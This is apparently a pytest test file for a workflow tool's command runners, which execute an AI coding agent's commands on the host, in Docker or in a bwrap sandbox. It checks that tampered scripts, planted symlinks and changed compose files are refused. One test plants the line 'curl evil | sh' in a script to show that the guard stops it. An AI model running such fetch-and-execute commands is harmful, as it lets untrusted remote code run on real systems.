"""Tests for claude_workflow.runners (no real docker or bwrap is ever called)."""

from __future__ import annotations

import json
import os
import subprocess
from dataclasses import replace
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from claude_workflow.commands import Command, host_script
from claude_workflow.config import DockerConfig, RepoAccess, default_config
from claude_workflow.runners import HostStop, RunContext, run
from claude_workflow.sandbox import SANDBOX_CACHE_DIR, SANDBOX_SCRATCH_GIT, SandboxSpec

HOST = "unix:///var/lib/cw-docker-sock/docker.sock"


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _make_worktree(tmp_path: Path) -> tuple[Path, str]:
    wt = tmp_path / "wt"
    wt.mkdir()
    _git(wt, "init")
    _git(wt, "config", "user.email", "t@example.com")
    _git(wt, "config", "user.name", "T")
    (wt / "bin").mkdir()
    (wt / "bin/run.sh").write_text("#!/bin/sh\necho base\n")
    os.chmod(wt / "bin/run.sh", 0o755)
    (wt / "docker-compose.yml").write_text("services: {}\n")
    (wt / "legacy").mkdir()
    (wt / "legacy/Foo.php").write_text("<?php\n")
    _git(wt, "add", ".")
    _git(wt, "commit", "-m", "base")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=wt, check=True, capture_output=True, text=True
    ).stdout.strip()
    return wt, base


def _cmd(name: str = "c", **overrides: Any) -> Command:
    fields: dict[str, Any] = {
        "name": name,
        "description": "",
        "run_in": "sandbox",
        "command": "true",
        "working_directory": None,
        "timeout": 60,
        "needs_compose_stack": False,
        "needs_git": False,
        "container": None,
        "user": None,
    }
    fields.update(overrides)
    return Command(**fields)


def _ctx(tmp_path: Path, wt: Path, base: str = "HEAD", **overrides: Any) -> RunContext:
    notes = tmp_path / "notes"
    notes.mkdir(exist_ok=True)
    cache = tmp_path / "cache"
    cache.mkdir(exist_ok=True)
    main = tmp_path / "main"
    main.mkdir(exist_ok=True)
    config = replace(
        default_config(),
        repo_path=main,
        docker=DockerConfig(project_name="proj", protected_paths=()),
        docker_host=HOST,
        worktree_base=tmp_path / "worktrees",
    )
    spec = SandboxSpec(
        repo_dir=wt,
        repo_access=RepoAccess.RO,
        state_dir=notes,
        skills_dirs=(),
        kb_dir=None,
        allow_network=False,
        workdir=wt,
        cache_dir=cache,
    )
    fields: dict[str, Any] = {
        "config": config,
        "worktree": wt,
        "base_commit": base,
        "sandbox": spec,
        "sandbox_env": {},
    }
    fields.update(overrides)
    return RunContext(**fields)


class _Recorder:
    """Stands in for docker_stack.run_command; records each call."""

    def __init__(self, results: list[tuple[str, str]] | None = None) -> None:
        self.calls: list[dict[str, Any]] = []
        self.results = results or []
        self.on_call: Any = None

    def __call__(
        self, argv: list[str], *, cwd: Path | None, env: dict[str, str] | None, timeout: int
    ) -> tuple[str, str]:
        self.calls.append({"argv": argv, "cwd": cwd, "env": env, "timeout": timeout})
        if self.on_call is not None:
            self.on_call(argv)
        return self.results.pop(0) if self.results else ("PASS", "ok")


def _sh(line: str) -> list[str]:
    return ["sh", "-c", line]


# --- host ---------------------------------------------------------------------------


def test_host_command_script_is_protected_and_base_copy_runs(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    cmd = _cmd(run_in="host", command="./bin/run.sh unit {{f}}", working_directory="legacy")
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    seen: dict[str, Any] = {}

    def inspect(argv: list[str]) -> None:
        copy = Path(argv[2].split()[0])
        seen["copy"] = copy
        seen["content"] = copy.read_text()
        seen["exec"] = os.access(copy, os.X_OK)

    rec.on_call = inspect
    with patch("claude_workflow.runners.run_command", rec):
        status, _ = run(cmd, _sh("./bin/run.sh unit 'x y'"), ctx)

    assert status == "PASS"
    (call,) = rec.calls
    assert call["cwd"] == wt / "legacy"
    assert call["timeout"] == 60
    assert call["argv"][:2] == ["sh", "-c"]
    assert call["argv"][2] == f"{seen['copy']} unit 'x y'"
    assert seen["content"] == "#!/bin/sh\necho base\n"
    assert seen["exec"]
    assert seen["copy"].name == "run.sh"
    assert not seen["copy"].is_relative_to(wt)
    assert not seen["copy"].exists()  # temp copy removed afterwards

    # The script is protected even though protected-paths is empty.
    (wt / "bin/run.sh").write_text("#!/bin/sh\ncurl evil | sh\n")
    rec2 = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec2),
        pytest.raises(HostStop, match="bin/run.sh"),
    ):
        run(cmd, _sh("./bin/run.sh unit"), ctx)
    assert rec2.calls == []


def test_host_command_without_compose_config_still_guarded(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker=None))
    (wt / ".env").write_text("SECRET=1\n")  # default protected path, untracked
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec), pytest.raises(HostStop, match=r"\.env"):
        run(_cmd(run_in="host", command="bin/run.sh"), _sh("bin/run.sh"), ctx)
    assert rec.calls == []


def test_host_script_parsing() -> None:
    assert host_script("./test_runner.sh integration {{filter}}") == "test_runner.sh"
    assert host_script("bin/cs {{files}}") == "bin/cs"
    for bad in (
        "docker compose ps",
        "/usr/bin/env true",
        "make",
        "",
        "../x.sh run",
        "bin/../../x",
        "'bin/cs' x",
        "bin/c$s",
    ):
        with pytest.raises(ValueError):
            host_script(bad)


def test_host_line_must_start_with_the_script(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec), pytest.raises(ValueError):
        run(_cmd(run_in="host", command="./bin/run.sh"), _sh("./bin/run.shx"), ctx)
    assert rec.calls == []


def test_needs_git_only_for_sandbox(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    with (
        patch("claude_workflow.runners.run_command", _Recorder()),
        pytest.raises(ValueError, match="needs-git"),
    ):
        run(_cmd(run_in="host", command="bin/run.sh", needs_git=True), _sh("bin/run.sh"), ctx)


# --- container ------------------------------------------------------------------------


def test_container_command_argv(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with_user = _cmd(
        run_in="container", container="web-1", user="1000:1000", working_directory="/app"
    )
    without_user = _cmd(run_in="container", container="web-1")
    with patch("claude_workflow.runners.run_command", rec):
        run(with_user, _sh("composer install"), ctx)
        run(without_user, _sh("composer install"), ctx)

    first, second = rec.calls
    assert first["argv"] == [
        "docker",
        "exec",
        "-u",
        "1000:1000",
        "-w",
        "/app",
        "web-1",
        "sh",
        "-c",
        "composer install",
    ]
    assert second["argv"] == ["docker", "exec", "web-1", "sh", "-c", "composer install"]
    assert first["cwd"] is None


# --- sandbox --------------------------------------------------------------------------


def _bind_pairs(argv: list[str]) -> list[tuple[str, str, str]]:
    pairs: list[tuple[str, str, str]] = []
    for i, word in enumerate(argv):
        if word in {"--bind", "--ro-bind"} and i + 2 < len(argv):
            pairs.append((word, argv[i + 1], argv[i + 2]))
    return pairs


@pytest.mark.parametrize("git_kind", ["file", "dir"])
def test_needs_git_mounts_scratch_git_dir(tmp_path: Path, git_kind: str) -> None:
    wt = tmp_path / "repo"
    wt.mkdir()
    real_git = tmp_path / "real-gitdir"
    real_git.mkdir()
    if git_kind == "file":
        (wt / ".git").write_text(f"gitdir: {real_git}\n")  # like a git worktree
    else:
        (wt / ".git").mkdir()
    ctx = _ctx(tmp_path, wt)
    sandbox_repo = str(Path.home() / "repo")
    seen: dict[str, Any] = {}

    def inspect(argv: list[str]) -> None:
        pairs = _bind_pairs(argv)
        seen["pairs"] = pairs
        if git_kind == "file":
            (git_dir,) = [src for _, src, dst in pairs if dst == SANDBOX_SCRATCH_GIT]
            (gitlink,) = [src for _, src, dst in pairs if dst == sandbox_repo + "/.git"]
            seen["gitlink"] = Path(gitlink).read_text()
        else:
            (git_dir,) = [src for _, src, dst in pairs if dst == sandbox_repo + "/.git"]
        seen["git_dir"] = Path(git_dir)
        seen["head"] = (Path(git_dir) / "HEAD").is_file()

    rec = _Recorder()
    rec.on_call = inspect
    with patch("claude_workflow.runners.run_command", rec):
        status, _ = run(_cmd(needs_git=True, command="bin/cs"), _sh("bin/cs"), ctx)

    assert status == "PASS"
    argv = rec.calls[0]["argv"]
    assert seen["head"]  # a real `git init` repo
    git_dir = seen["git_dir"]
    for forbidden in (wt, ctx.sandbox.state_dir, real_git):
        assert not git_dir.is_relative_to(forbidden)
    assert str(real_git) not in " ".join(argv)
    assert ["--ro-bind", "/dev/null", sandbox_repo + "/.git"] != argv[-3:]
    assert all(argv[i - 1] != "--tmpfs" for i, w in enumerate(argv) if w == sandbox_repo + "/.git")
    if git_kind == "file":
        assert seen["gitlink"] == f"gitdir: {SANDBOX_SCRATCH_GIT}\n"
        assert ("--ro-bind", "/dev/null", sandbox_repo + "/.git") not in seen["pairs"]
    else:
        assert ("--bind", str(git_dir), sandbox_repo + "/.git") in seen["pairs"]
    assert not git_dir.exists()  # removed afterwards


def test_sandbox_without_needs_git_keeps_mask(tmp_path: Path) -> None:
    wt = tmp_path / "repo"
    wt.mkdir()
    (wt / ".git").write_text("gitdir: /elsewhere\n")
    ctx = _ctx(tmp_path, wt)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(), _sh("true"), ctx)
    pairs = _bind_pairs(rec.calls[0]["argv"])
    assert ("--ro-bind", "/dev/null", str(Path.home() / "repo/.git")) in pairs
    assert all(dst != SANDBOX_SCRATCH_GIT for _, _, dst in pairs)


def test_untrusted_sandbox_run_has_no_cache(tmp_path: Path) -> None:
    wt = tmp_path / "repo"
    (wt / "legacy").mkdir(parents=True)
    ctx = _ctx(tmp_path, wt)
    cmd = _cmd(working_directory="legacy", timeout=90)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(cmd, _sh("vendor/bin/phpunit"), ctx)  # default: untrusted
        run(cmd, _sh("vendor/bin/phpunit"), replace(ctx, trusted=True))

    untrusted, trusted = (c["argv"] for c in rec.calls)
    assert SANDBOX_CACHE_DIR not in untrusted
    assert str(tmp_path / "cache") not in untrusted
    assert ("--bind", str(tmp_path / "cache"), SANDBOX_CACHE_DIR) in _bind_pairs(trusted)
    for argv in (untrusted, trusted):
        assert argv[0] == "bwrap"
        assert argv[-3:] == ["sh", "-c", "vendor/bin/phpunit"]
        chdir = argv[argv.index("--chdir") + 1]
        assert chdir == str(Path.home() / "repo" / "legacy")
    assert rec.calls[0]["timeout"] == 90


def test_working_directory_may_not_escape(tmp_path: Path) -> None:
    wt = tmp_path / "repo"
    wt.mkdir()
    (wt / "link").symlink_to(tmp_path)
    ctx = _ctx(tmp_path, wt)
    with patch("claude_workflow.runners.run_command", _Recorder()):
        for bad in ("../x", "/etc", "link"):
            with pytest.raises(ValueError):
                run(_cmd(working_directory=bad), _sh("true"), ctx)


# --- compose stack --------------------------------------------------------------------


def _is_up(argv: list[str]) -> bool:
    return argv[:2] == ["docker", "compose"] and "up" in argv


def test_compose_up_once_for_two_commands(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    first = _cmd("a", run_in="container", container="web-1", needs_compose_stack=True)
    second = _cmd("b", run_in="host", command="./bin/run.sh", needs_compose_stack=True)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(first, _sh("composer install"), ctx)
        # A trusted copy of the context shares the stack state.
        run(second, _sh("./bin/run.sh"), replace(ctx, trusted=True))

    ups = [c for c in rec.calls if _is_up(c["argv"])]
    assert len(ups) == 1
    assert ups[0]["cwd"] == wt
    assert ups[0]["env"]["COMPOSE_PROJECT_NAME"] == "proj"
    assert ups[0]["timeout"] == 900 + 600
    assert [_is_up(c["argv"]) for c in rec.calls] == [True, False, False]
    assert rec.calls[2]["env"]["COMPOSE_PROJECT_NAME"] == "proj"
    assert ctx.stack.result == ("PASS", "ok")


def test_compose_up_failure_is_not_retried(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder([("FAIL (exit 1)", "boom")])
    with patch("claude_workflow.runners.run_command", rec):
        one = run(cmd, _sh("true"), ctx)
        two = run(cmd, _sh("true"), ctx)
    assert len(rec.calls) == 1
    assert one == two
    assert one[0].startswith("FAIL") and "boom" in one[1]


def test_compose_up_refused_when_compose_file_changed(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    (wt / "docker-compose.yml").write_text("services: {evil: {}}\n")
    ctx = _ctx(tmp_path, wt, base)
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="docker-compose.yml"),
    ):
        run(cmd, _sh("true"), ctx)
    assert rec.calls == []


def test_compose_stack_without_config_fails(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker=None))
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        status, output = run(cmd, _sh("true"), ctx)
    assert status.startswith("FAIL") and "docker-compose" in output
    assert rec.calls == []


def test_symlinked_script_in_base_is_refused(tmp_path: Path) -> None:
    wt, _ = _make_worktree(tmp_path)
    (wt / "docker").mkdir()
    (wt / "docker/run.sh").write_text("#!/bin/sh\necho unprotected\n")
    os.chmod(wt / "docker/run.sh", 0o755)
    (wt / "bin/link.sh").symlink_to("../docker/run.sh")
    _git(wt, "add", ".")
    _git(wt, "commit", "-m", "link")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=wt, check=True, capture_output=True, text=True
    ).stdout.strip()
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="regular file"),
    ):
        run(_cmd(run_in="host", command="bin/link.sh"), _sh("bin/link.sh"), ctx)
    assert rec.calls == []


def test_non_script_host_command_is_refused_at_run_time(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    for command in ("make test", "npm run x", "/usr/bin/x", "docker compose ps"):
        with (
            patch("claude_workflow.runners.run_command", rec),
            pytest.raises(ValueError, match="repo script"),
        ):
            run(_cmd(run_in="host", command=command), _sh(command), ctx)
    assert rec.calls == []


# --- symlinks -------------------------------------------------------------------------


def test_compose_up_refused_for_new_symlink(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    home = tmp_path / "home"
    home.mkdir()
    (wt / "legacy/Foo.php").unlink()
    (wt / "legacy").rmdir()
    (wt / "legacy").symlink_to(home)  # e.g. ./api-documentation -> $HOME
    ctx = _ctx(tmp_path, wt, base)
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(
            HostStop, match="symlink in the worktree that is not in the base commit: legacy"
        ),
    ):
        run(cmd, _sh("true"), ctx)
    assert rec.calls == []
    assert ctx.stack.result is None


def test_host_run_refused_for_new_symlink(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    (wt / "cache").symlink_to(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="symlink.*: cache"),
    ):
        run(_cmd(run_in="host", command="bin/run.sh"), _sh("bin/run.sh"), ctx)
    assert rec.calls == []


def test_symlink_appearing_after_up_stops_the_host_run(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    cmd = _cmd(run_in="host", command="./bin/run.sh", needs_compose_stack=True)
    rec = _Recorder()
    # A container (running Claude's code) plants a symlink in a bind-mounted folder.
    rec.on_call = lambda argv: (wt / "planted").symlink_to(tmp_path)
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="planted"),
    ):
        run(cmd, _sh("./bin/run.sh"), ctx)
    assert len(rec.calls) == 1 and _is_up(rec.calls[0]["argv"])


def test_container_command_passes_docker_host(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(run_in="container", container="web-1"), _sh("true"), ctx)
    assert rec.calls[0]["env"] is not None
    assert rec.calls[0]["env"]["DOCKER_HOST"] == HOST


def test_container_command_stops_without_docker_host(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker_host=None))
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="docker-host"),
    ):
        run(_cmd(run_in="container", container="web-1"), _sh("true"), ctx)
    assert rec.calls == []


def test_host_command_with_compose_config_stops_without_docker_host(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker_host=None))
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="docker-host"),
    ):
        run(_cmd(run_in="host", command="./bin/run.sh"), _sh("./bin/run.sh"), ctx)
    assert rec.calls == []


def test_host_command_passes_docker_host(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(run_in="host", command="./bin/run.sh"), _sh("./bin/run.sh"), ctx)
    assert rec.calls[0]["env"]["DOCKER_HOST"] == HOST


def test_compose_up_stops_without_docker_host(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker_host=None))
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="docker-host"),
    ):
        run(cmd, _sh("true"), ctx)
    assert rec.calls == []  # `up` never called


def test_compose_up_stops_for_worktree_base_in_home(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, worktree_base=Path.home() / "wt"))
    cmd = _cmd(run_in="container", container="web-1", needs_compose_stack=True)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="cw-docker can't read"),
    ):
        run(cmd, _sh("true"), ctx)
    assert rec.calls == []


# --- compose override -----------------------------------------------------------------

_SOCKET_MODEL: dict[str, Any] = {
    "services": {
        "proxy": {
            "volumes": [{"type": "bind", "source": "/var/run/docker.sock", "target": "/t.sock"}]
        }
    }
}


@pytest.fixture(autouse=True)
def _fake_compose_model() -> Any:
    """`docker compose config` never runs for real; the model has no socket mounts."""
    with patch("claude_workflow.runners.compose_model", return_value={"services": {}}) as mock:
        yield mock


def test_compose_up_writes_override_and_uses_it(tmp_path: Path, _fake_compose_model: Any) -> None:
    _fake_compose_model.return_value = _SOCKET_MODEL
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    config = replace(ctx.config, state_base=tmp_path / "state")
    ctx = replace(ctx, config=config)
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(
            _cmd(run_in="host", command="./bin/run.sh", needs_compose_stack=True),
            _sh("./bin/run.sh"),
            ctx,
        )
    override = tmp_path / "state" / "compose" / "proj.override.json"
    assert json.loads(override.read_text())["services"]["proxy"]["volumes"][0]["source"] == (
        "/var/lib/cw-docker-sock/docker.sock"
    )
    up = next(c for c in rec.calls if _is_up(c["argv"]))
    assert ["--file", str(override)] == up["argv"][
        up["argv"].index(str(wt / "docker-compose.yml")) + 1 :
    ][:2]
    assert up["env"]["COMPOSE_FILE"].endswith(f":{override}")
    # the host command sees the same override
    assert rec.calls[-1]["env"]["COMPOSE_FILE"].endswith(f":{override}")


def test_compose_up_without_socket_mounts_still_runs(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = replace(
        _ctx(tmp_path, wt, base),
        config=replace(_ctx(tmp_path, wt, base).config, state_base=tmp_path / "state"),
    )
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(run_in="container", container="web-1", needs_compose_stack=True), _sh("true"), ctx)
    override = tmp_path / "state" / "compose" / "proj.override.json"
    assert json.loads(override.read_text()) == {"services": {}}
    assert any(_is_up(c["argv"]) for c in rec.calls)


def test_compose_up_config_failure_is_host_stop(tmp_path: Path, _fake_compose_model: Any) -> None:
    _fake_compose_model.side_effect = ValueError("docker compose config failed")
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop, match="compose override"),
    ):
        run(_cmd(run_in="container", container="web-1", needs_compose_stack=True), _sh("true"), ctx)
    assert rec.calls == []


def test_compose_up_failure_gets_port_hint(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    rec = _Recorder([("FAIL (exit 1)", "listen tcp :80: address already in use")])
    with patch("claude_workflow.runners.run_command", rec):
        status, output = run(
            _cmd(run_in="container", container="web-1", needs_compose_stack=True), _sh("true"), ctx
        )
    assert status.startswith("FAIL")
    assert "stop your dev stack" in output


def test_docker_host_symlink_loop_stops(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    loop = tmp_path / "loop"
    loop.symlink_to(loop)
    ctx = replace(ctx, config=replace(ctx.config, worktree_base=loop))
    rec = _Recorder()
    with (
        patch("claude_workflow.runners.run_command", rec),
        pytest.raises(HostStop),
    ):
        run(_cmd(run_in="container", container="web-1"), _sh("true"), ctx)
    assert rec.calls == []


def test_host_command_without_compose_config_passes_docker_host(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker=None))
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(run_in="host", command="./bin/run.sh"), _sh("./bin/run.sh"), ctx)
    assert rec.calls[0]["env"]["DOCKER_HOST"] == HOST


def test_host_command_without_any_docker_config_keeps_env_unchanged(tmp_path: Path) -> None:
    wt, base = _make_worktree(tmp_path)
    ctx = _ctx(tmp_path, wt, base)
    ctx = replace(ctx, config=replace(ctx.config, docker=None, docker_host=None))
    rec = _Recorder()
    with patch("claude_workflow.runners.run_command", rec):
        run(_cmd(run_in="host", command="./bin/run.sh"), _sh("./bin/run.sh"), ctx)
    assert rec.calls[0]["env"] is None
